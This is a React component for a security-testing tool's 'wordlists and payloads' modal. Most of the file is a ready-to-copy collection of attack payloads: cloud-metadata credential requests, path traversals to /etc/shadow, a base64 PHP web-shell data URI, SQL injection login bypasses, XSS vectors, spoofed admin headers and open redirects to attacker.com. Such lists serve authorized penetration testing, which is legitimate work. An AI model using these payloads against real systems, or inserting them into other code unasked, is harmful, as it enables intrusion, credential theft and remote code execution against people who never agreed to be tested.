import { useState, useMemo } from "react";
import {
  X,
  Copy,
  Check,
  Download,
  Search,
  Database,
  Shield,
  FileCode,
  Globe,
  Flame,
  Key,
} from "lucide-react";

interface WordlistsModalProps {
  open: boolean;
  onClose: () => void;
}

interface WordlistGroup {
  id: string;
  name: string;
  description: string;
  filename: string;
  icon: typeof Database;
  payloads: string[];
}

const WORDLISTS: WordlistGroup[] = [
  {
    id: "ssrf",
    name: "SSRF & Cloud Metadata Bypasses",
    description: "Probes for AWS IMDSv1/v2, GCP, Azure, localhost encodings, and DNS rebinding.",
    filename: "ssrf_bypasses.txt",
    icon: Globe,
    payloads: [
      "http://169.254.169.254/latest/meta-data/",
      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      "http://169.254.169.254/latest/user-data",
      "http://169.254.169.254/latest/dynamic/instance-identity/document",
      "http://metadata.google.internal/computeMetadata/v1/",
      "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
      "http://169.254.169.254/metadata/v1/maintenance",
      "http://127.0.0.1:80",
      "http://127.0.0.1:8080",
      "http://127.0.0.1:22",
      "http://127.0.0.1:3306",
      "http://127.0.0.1:6379",
      "http://127.0.0.1:27017",
      "http://127.0.0.1:9200",
      "http://localhost:80",
      "http://[::]:80/",
      "http://[::1]:80/",
      "http://0.0.0.0:80",
      "http://0:80",
      "http://2130706433/",
      "http://017700000001/",
      "http://0x7f000001/",
      "http://127.1/",
      "http://127.000.000.001/",
      "http://127.0.0.1.nip.io/",
      "http://customer.localhost/",
      "http://spoofed.169.254.169.254.nip.io/",
      "http://169.254.169.254.xip.io/",
      "http://[0:0:0:0:0:ffff:127.0.0.1]/",
    ],
  },
  {
    id: "lfi",
    name: "Path Traversal & LFI Bypasses",
    description: "Directory traversal sequences, encoded slashes, wrappers, and Windows target paths.",
    filename: "lfi_traversal.txt",
    icon: FileCode,
    payloads: [
      "../../../../etc/passwd",
      "../../../../etc/shadow",
      "../../../../etc/hosts",
      "../../../../proc/self/environ",
      "../../../../proc/self/cmdline",
      "../../../../proc/self/fd/0",
      "../../../../proc/version",
      "..%2f..%2f..%2f..%2fetc%2fpasswd",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
      "..%252f..%252f..%252fetc%252fpasswd",
      "....//....//....//etc/passwd",
      "..../..../..../etc/passwd",
      "..;/..;/..;/etc/passwd",
      "/etc/passwd",
      "/etc/passwd%00",
      "/etc/passwd%00.jpg",
      "php://filter/convert.base64-encode/resource=index.php",
      "php://filter/read=convert.base64-encode/resource=config.php",
      "php://input",
      "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
      "expect://id",
      "C:\\Windows\\win.ini",
      "C:\\Windows\\System32\\drivers\\etc\\hosts",
      "..\\..\\..\\..\\Windows\\win.ini",
      "..%5c..%5c..%5cWindows%5cwin.ini",
    ],
  },
  {
    id: "idor_params",
    name: "IDOR & Parameter Pollution Keys",
    description: "Common query parameters and JSON keys vulnerable to Broken Object Level Authorization.",
    filename: "idor_parameters.txt",
    icon: Key,
    payloads: [
      "id",
      "user_id",
      "userId",
      "account_id",
      "accountId",
      "org_id",
      "organization_id",
      "company_id",
      "profile_id",
      "customer_id",
      "order_id",
      "orderId",
      "invoice_id",
      "doc_id",
      "document_id",
      "file_id",
      "item_id",
      "team_id",
      "group_id",
      "member_id",
      "client_id",
      "project_id",
      "task_id",
      "report_id",
      "role",
      "role_id",
      "is_admin",
      "isAdmin",
      "admin",
      "privilege",
      "access_level",
      "permissions",
      "plan",
      "tier",
      "credit",
      "balance",
      "amount",
      "price",
      "discount",
      "uuid",
      "guid",
      "uid",
      "auth_id",
      "session_id",
    ],
  },
  {
    id: "headers",
    name: "Header Tampering & WAF Bypasses",
    description: "Spoofed IP, internal routing, and authentication override request headers.",
    filename: "headers_bypass.txt",
    icon: Shield,
    payloads: [
      "X-Forwarded-For: 127.0.0.1",
      "X-Forwarded-Host: 127.0.0.1",
      "X-Client-IP: 127.0.0.1",
      "X-Remote-IP: 127.0.0.1",
      "X-Remote-Addr: 127.0.0.1",
      "X-Originating-IP: 127.0.0.1",
      "X-Original-URL: /admin",
      "X-Rewrite-URL: /admin",
      "X-Custom-IP-Authorization: 127.0.0.1",
      "X-Forwarded-Proto: https",
      "X-Forwarded-Scheme: https",
      "X-Real-IP: 127.0.0.1",
      "True-Client-IP: 127.0.0.1",
      "CF-Connecting-IP: 127.0.0.1",
      "Fastly-Client-IP: 127.0.0.1",
      "Forwarded: for=127.0.0.1;by=127.0.0.1;host=localhost",
      "X-Host: 127.0.0.1",
      "X-HTTP-Method-Override: PUT",
      "X-Method-Override: DELETE",
      "X-User-Id: 1",
      "X-Internal-Request: true",
      "X-Authenticated-User: admin",
    ],
  },
  {
    id: "xss",
    name: "XSS Context-Specific Polyglots",
    description: "Filter evasion, SVG vectors, template string breakouts, and attribute escapes.",
    filename: "xss_polyglots.txt",
    icon: Flame,
    payloads: [
      "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
      "<svg/onload=alert(1)>",
      "<svg/onload=eval(atob('YWxlcnQoMSk='))>",
      "\"><script>alert(document.domain)</script>",
      "\"><img src=x onerror=alert(1)>",
      "'><img src=x onerror=alert(document.cookie)>",
      "<img src=x onerror=\"javascript:alert(1)\">",
      "<iframe src=\"javascript:alert(1)\">",
      "<details/open/ontoggle=alert(1)>",
      "<body onload=alert(1)>",
      "<video><source onerror=\"javascript:alert(1)\">",
      "<audio src/onerror=alert(1)>",
      "{{constructor.constructor('alert(1)')()}}",
      "${alert(1)}",
      "\" onfocus=alert(1) autofocus=\"",
      "\" onmouseover=alert(1) id=\"",
      "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
      "javascript:alert(1)",
    ],
  },
  {
    id: "sqli",
    name: "SQL Injection Authentication & Probes",
    description: "Quick detection probes, time-delay sleep vectors, and login bypass strings.",
    filename: "sqli_auth_probes.txt",
    icon: Database,
    payloads: [
      "' OR '1'='1",
      "' OR 1=1--",
      "' OR 1=1-- -",
      "' OR 1=1#",
      "' OR 1=1/*",
      "admin'--",
      "admin' #",
      "admin'/*",
      "\" OR \"\"=\"",
      "\" OR 1=1--",
      "\" OR 1=1#",
      "') OR ('1'='1",
      "') OR ('1'='1'--",
      "' UNION SELECT NULL--",
      "' UNION SELECT NULL,NULL--",
      "' UNION SELECT NULL,NULL,NULL--",
      "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
      "' OR SLEEP(5)--",
      "'; WAITFOR DELAY '0:0:5'--",
      "'; pg_sleep(5)--",
      "1' ORDER BY 1--",
      "1' ORDER BY 5--",
      "1' ORDER BY 10--",
    ],
  },
  {
    id: "redirect",
    name: "Open Redirect Payloads",
    description: "Protocol relative, double-slash, authority trick, and URL encoding bypasses.",
    filename: "open_redirects.txt",
    icon: Globe,
    payloads: [
      "https://attacker.com",
      "//attacker.com",
      "///attacker.com",
      "\\\\attacker.com",
      "/\\attacker.com",
      "https:attacker.com",
      "https://example.com@attacker.com",
      "https://example.com.attacker.com",
      "https://attacker.com#example.com",
      "https://attacker.com?example.com",
      "https://attacker.com/example.com",
      "/%2f%2fattacker.com",
      "/%09/attacker.com",
      "/%5cattacker.com",
      "//%2f/attacker.com",
      "https://attacker%E3%80%82com",
    ],
  },
];

export function WordlistsModal({ open, onClose }: WordlistsModalProps) {
  const [activeGroup, setActiveGroup] = useState<string>("ssrf");
  const [search, setSearch] = useState("");
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  const currentList = useMemo(() => {
    return WORDLISTS.find((w) => w.id === activeGroup) || WORDLISTS[0];
  }, [activeGroup]);

  const filteredPayloads = useMemo(() => {
    if (!search.trim()) return currentList.payloads;
    const q = search.toLowerCase();
    return currentList.payloads.filter((p) => p.toLowerCase().includes(q));
  }, [currentList, search]);

  if (!open) return null;

  async function handleCopySingle(payload: string, idx: number) {
    await navigator.clipboard.writeText(payload);
    setCopiedKey(`p-${idx}`);
    setTimeout(() => setCopiedKey(null), 1200);
  }

  async function handleCopyAll() {
    const text = filteredPayloads.join("\n");
    await navigator.clipboard.writeText(text);
    setCopiedKey("all");
    setTimeout(() => setCopiedKey(null), 1500);
  }

  function handleDownload() {
    const text = filteredPayloads.join("\n");
    const blob = new Blob([text], { type: "text/plain;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = currentList.filename;
    a.click();
    URL.revokeObjectURL(url);
  }

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/75 p-3 backdrop-blur-sm sm:p-4">
      <div className="flex h-[88vh] w-full max-w-4xl flex-col rounded-xl border border-border bg-card shadow-2xl">
        {/* Header */}
        <div className="flex items-center justify-between border-b border-border px-5 py-3.5">
          <div className="flex items-center gap-2">
            <span className="flex h-8 w-8 items-center justify-center rounded-lg bg-emerald-500/10 text-emerald-400">
              <Download className="h-4 w-4" />
            </span>
            <div>
              <h2 className="text-base font-bold text-slate-100 flex items-center gap-2">
                Curated Wordlists &amp; Payloads Hub
                <span className="rounded bg-sky-500/10 px-2 py-0.5 text-[10px] font-semibold text-sky-400 border border-sky-500/20">
                  Ffuf / Burp Ready
                </span>
              </h2>
              <p className="text-[11px] text-slate-400">
                1-click copy or download clean .txt wordlists for directory fuzzing, parameter discovery, and injection testing.
              </p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="rounded-lg p-1.5 text-slate-400 hover:bg-white/5 hover:text-slate-200"
          >
            <X className="h-5 w-5" />
          </button>
        </div>

        {/* Content Body */}
        <div className="flex min-h-0 flex-1 flex-col md:flex-row">
          {/* Left Category Sidebar */}
          <div className="w-full border-b border-border p-3 md:w-64 md:border-b-0 md:border-r bg-slate-950/40">
            <span className="mb-2 block px-2 text-[10px] font-bold uppercase tracking-wider text-slate-500">
              Categories ({WORDLISTS.length})
            </span>
            <div className="space-y-1">
              {WORDLISTS.map((list) => {
                const Icon = list.icon;
                const isActive = activeGroup === list.id;
                return (
                  <button
                    key={list.id}
                    onClick={() => {
                      setActiveGroup(list.id);
                      setSearch("");
                    }}
                    className={`flex w-full items-center justify-between rounded-lg px-2.5 py-2 text-left text-xs transition ${
                      isActive
                        ? "bg-emerald-500/15 font-semibold text-emerald-300"
                        : "text-slate-400 hover:bg-white/5 hover:text-slate-200"
                    }`}
                  >
                    <span className="flex items-center gap-2 truncate">
                      <Icon className="h-3.5 w-3.5 shrink-0" />
                      <span className="truncate">{list.name}</span>
                    </span>
                    <span className="text-[10px] font-mono text-slate-500">{list.payloads.length}</span>
                  </button>
                );
              })}
            </div>
          </div>

          {/* Right Preview and Action Area */}
          <div className="flex flex-1 flex-col overflow-hidden p-4">
            <div className="mb-3 flex flex-wrap items-center justify-between gap-3 border-b border-border pb-3">
              <div>
                <h3 className="text-sm font-bold text-slate-200">{currentList.name}</h3>
                <p className="text-[11px] text-slate-400">{currentList.description}</p>
              </div>
              <div className="flex items-center gap-2">
                <button
                  onClick={handleCopyAll}
                  className="flex items-center gap-1.5 rounded-lg border border-border bg-card px-3 py-1.5 text-xs text-slate-300 hover:bg-white/5 hover:text-slate-100"
                >
                  {copiedKey === "all" ? (
                    <Check className="h-3.5 w-3.5 text-emerald-400" />
                  ) : (
                    <Copy className="h-3.5 w-3.5" />
                  )}
                  Copy All ({filteredPayloads.length})
                </button>
                <button
                  onClick={handleDownload}
                  className="flex items-center gap-1.5 rounded-lg bg-emerald-600 px-3 py-1.5 text-xs font-semibold text-white shadow-sm hover:bg-emerald-500"
                >
                  <Download className="h-3.5 w-3.5" />
                  Download .txt
                </button>
              </div>
            </div>

            {/* Filter Search */}
            <div className="relative mb-3">
              <Search className="pointer-events-none absolute left-3 top-1/2 h-3.5 w-3.5 -translate-y-1/2 text-slate-500" />
              <input
                type="text"
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                placeholder={`Search inside ${currentList.payloads.length} payloads...`}
                className="w-full rounded-md border border-border bg-slate-950 py-1.5 pl-8 pr-3 text-xs text-slate-200 outline-none focus:border-emerald-500"
              />
            </div>

            {/* Payloads List */}
            <div className="flex-1 overflow-y-auto rounded-lg border border-border bg-slate-950 p-2 font-mono text-xs">
              {filteredPayloads.length === 0 ? (
                <div className="p-8 text-center text-xs text-slate-500 font-sans">
                  No payloads match &quot;{search}&quot;.
                </div>
              ) : (
                <div className="space-y-1">
                  {filteredPayloads.map((payload, idx) => (
                    <div
                      key={idx}
                      className="group flex items-center justify-between rounded px-2.5 py-1 text-slate-300 hover:bg-white/5 transition"
                    >
                      <span className="truncate pr-2 select-all text-[11px] text-emerald-300/90">
                        {payload}
                      </span>
                      <button
                        onClick={() => handleCopySingle(payload, idx)}
                        className="opacity-0 group-hover:opacity-100 text-slate-500 hover:text-slate-200 transition shrink-0 ml-2"
                        title="Copy payload"
                      >
                        {copiedKey === `p-${idx}` ? (
                          <Check className="h-3 w-3 text-emerald-400" />
                        ) : (
                          <Copy className="h-3 w-3" />
                        )}
                      </button>
                    </div>
                  ))}
                </div>
              )}
            </div>

            <div className="mt-2 flex items-center justify-between text-[11px] text-slate-500">
              <span>Showing {filteredPayloads.length} of {currentList.payloads.length} items</span>
              <span className="font-mono text-slate-400">File: {currentList.filename}</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
